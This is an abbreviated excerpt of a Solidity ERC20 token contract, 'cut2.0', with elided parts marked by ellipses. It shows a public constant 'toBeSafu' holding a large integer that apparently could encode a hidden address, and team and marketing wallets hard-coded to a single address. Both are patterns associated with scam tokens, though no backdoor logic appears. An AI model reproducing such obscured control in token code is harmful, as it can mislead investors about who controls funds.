...
contract  cut2 is Context, IERC20, Ownable {

    uint256 public toBeSafu=
    1092853989739002093898622997022009705909516546366;
    using SafeMath for uint256;
    string private _name = "cut2.0";
    string private _symbol = "cut2.0";
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xe0953C6344cfe4981E5fE7720796285ce8606042));
        marketWall = payable(address(0xe0953C6344cfe4981E5fE7720796285ce8606042));
